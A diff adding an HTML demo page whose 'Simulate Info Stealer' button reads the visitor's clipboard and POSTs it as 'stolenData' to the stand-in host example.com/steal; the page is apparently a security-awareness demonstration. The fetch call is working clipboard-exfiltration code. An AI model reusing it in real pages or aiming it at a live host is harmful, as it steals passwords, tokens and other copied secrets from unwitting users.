@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Clipboard Demo - Dual Mode</title>
+  <style>
+    body {
+      background-color: #0e1a3a;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #FFA500;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      margin: 20px;
+      background-color: #1f2f55;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    button:hover {
+      background-color: #FFA500;
+      color: #000;
+    }
+    #output {
+      margin-top: 30px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <h1 id="title">Clipboard Demo - Dual Mode</h1>
+  <button id="readBtn">Read Clipboard</button>
+  <button id="stealBtn">Simulate Info Stealer</button>
+  <div id="output"></div>
+
+  <script>
+    document.getElementById("readBtn").onclick = async function () {
+      try {
+        const data = await navigator.clipboard.readText();
+        document.getElementById("output").innerText = "Clipboard (Read): " + data;
+      } catch (err) {
+        document.getElementById("output").innerText = "⚠️ Failed to read clipboard: " + err;
+      }
+    };
+
+    document.getElementById("stealBtn").onclick = async function () {
+      try {
+        const data = await navigator.clipboard.readText();
+        document.getElementById("output").innerText = "Clipboard (Stolen): " + data;
+        // Simulated exfiltration
+        fetch("https://example.com/steal", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ stolenData: data }),
+        });
+        console.log("Simulated exfiltration to https://example.com/steal");
+      } catch (err) {
+        document.getElementById("output").innerText = "⚠️ Failed to steal clipboard: " + err;
+      }
+    };
+  </script>
+</body>
+</html>
